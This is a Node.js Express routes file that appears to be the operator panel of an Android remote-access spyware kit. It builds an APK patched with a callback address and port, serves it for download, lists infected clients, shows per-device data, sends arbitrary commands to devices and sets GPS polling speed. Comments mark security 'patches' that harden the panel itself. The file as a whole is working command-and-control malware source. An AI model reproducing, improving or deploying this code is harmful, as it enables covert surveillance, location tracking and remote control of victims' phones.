const
    express = require('express'),
    routes = express.Router(),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    crypto = require('crypto'),
    fs = require('fs'),
    path = require('path');

let CONST = global.CONST;
let db = global.db;
let logManager = global.logManager;
let app = global.app;
let clientManager = global.clientManager;
let apkBuilder = global.apkBuilder;

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

function isAllowed(req, res, next) {
    let cookies = req.cookies;
    let loginToken = db.maindb.get('admin.loginToken').value();
    if (loginToken && cookies && 'loginToken' in cookies && loginToken !== '') {
        if (cookies.loginToken === loginToken) next();
        else res.clearCookie('loginToken').redirect('/login');
    } else res.redirect('/login');
    // next();
}

routes.get('/dl', (req, res) => {
    res.redirect('/build.s.apk');
});

routes.get('/', isAllowed, (req, res) => {
    res.render('index', {
        clientsOnline: clientManager.getClientListOnline(),
        clientsOffline: clientManager.getClientListOffline()
    });
});


routes.get('/login', (req, res) => {
    res.render('login');
});

const loginRateLimit = {};
routes.post('/login', (req, res) => {
    // Simple Rate Limiting
    const ip = req.ip;
    const now = Date.now();
    if (loginRateLimit[ip] && now - loginRateLimit[ip].lastAttempt < 2000) {
        return res.redirect('/login?e=tooManyRequests');
    }

    // Patch 7: Prevent Memory Leak with time-based eviction + hard cap
    const keys = Object.keys(loginRateLimit);
    if (keys.length > 1000) {
        delete loginRateLimit[keys[0]];
    }
    for (const key of Object.keys(loginRateLimit)) {
        if (now - loginRateLimit[key].lastAttempt > 300000) { // 5 min TTL
            delete loginRateLimit[key];
        }
    }

    loginRateLimit[ip] = { lastAttempt: now };

    if ('username' in req.body && 'password' in req.body) {
        // Guard against non-string input (e.g., arrays, objects)
        if (typeof req.body.username !== 'string' || typeof req.body.password !== 'string') {
            return res.redirect('/login?e=badLogin');
        }

        let rUsername = db.maindb.get('admin.username').value();
        let rPassword = db.maindb.get('admin.password').value();

        // For now, keep MD5 but ensure it's a string.
        // In a real upgrade, we'd use scrypt/bcrypt, but that requires resetting maindb.json.
        let passwordMD5 = crypto.createHash('md5').update(String(req.body.password)).digest("hex");

        if (String(req.body.username) === rUsername && passwordMD5 === rPassword) {
            // Patch 2: Secure Session Token
            let loginToken = crypto.randomBytes(32).toString('hex');
            db.maindb.get('admin').assign({ loginToken }).write();
            res.cookie('loginToken', loginToken, { httpOnly: true, sameSite: 'strict' }).redirect('/');
        } else return res.redirect('/login?e=badLogin');
    } else return res.redirect('/login?e=missingData');
});

routes.get('/logout', isAllowed, (req, res) => {
    db.maindb.get('admin').assign({ loginToken: '' }).write();
    res.clearCookie('loginToken').redirect('/');
});

routes.get('/download/:filename', isAllowed, (req, res) => {
    const filename = req.params.filename.replace(/[^a-zA-Z0-9.-]/g, '');
    if (!filename || filename === '.' || filename === '..') return res.status(400).send('Invalid filename');
    const filePath = path.join(CONST.downloadsFullPath, filename);
    if (fs.existsSync(filePath)) {
        res.download(filePath);
    } else {
        res.status(404).send('File not found');
    }
});


routes.get('/builder', isAllowed, (req, res) => {
    res.render('builder', {
        myPort: CONST.control_port
    });
});

routes.post('/builder', isAllowed, (req, res) => {
    // Patch 12: Move sensitive data to req.body
    const { uri, port } = req.body;
    if (uri !== undefined && port !== undefined) apkBuilder.patchAPK(uri, port, (error) => {
        if (!error) apkBuilder.buildAPK((error) => {
            if (!error) {
                logManager.log(CONST.logTypes.success, "Build Succeded!");
                res.json({ error: false });
            }
            else {
                logManager.log(CONST.logTypes.error, "Build Failed - " + error);
                res.json({ error });
            }
        });
        else {
            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
            res.json({ error });
        }
    });
    else {
        logManager.log(CONST.logTypes.error, "Build Failed - Missing URI or Port");
        res.json({ error: "Missing URI or Port" });
    }
});


routes.get('/logs', isAllowed, (req, res) => {
    res.render('logs', {
        logs: logManager.getLogs()
    });
});



routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
    // Sanitize inputs
    const deviceID = req.params.deviceid.replace(/[^a-zA-Z0-9_-]/g, '');
    const page = req.params.page.replace(/[^a-zA-Z]/g, '');

    let pageData = clientManager.getClientDataByPage(deviceID, page, req.query.filter);
    if (pageData) res.render('deviceManager', {
        page: page,
        deviceID: deviceID,
        baseURL: '/manage/' + deviceID,
        pageData
    });
    else res.render('deviceManager', {
        page: 'notFound',
        deviceID: deviceID,
        baseURL: '/manage/' + deviceID
    });
});

routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
    // Sanitize deviceid
    const deviceID = req.params.deviceid.replace(/[^a-zA-Z0-9_-]/g, '');
    
    // Patch 12: Use req.body for command payloads
    clientManager.sendCommand(deviceID, req.params.commandID, req.body, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
    const deviceID = req.params.deviceid.replace(/[^a-zA-Z0-9_-]/g, '');
    const speed = parseInt(req.params.speed, 10);
    if (isNaN(speed) || !Number.isInteger(Number(req.params.speed))) return res.json({ error: 'Invalid Speed' });

    clientManager.setGpsPollSpeed(deviceID, speed, (error) => {
        if (!error) res.json({ error: false })
        else res.json({ error })
    });
});

module.exports = routes;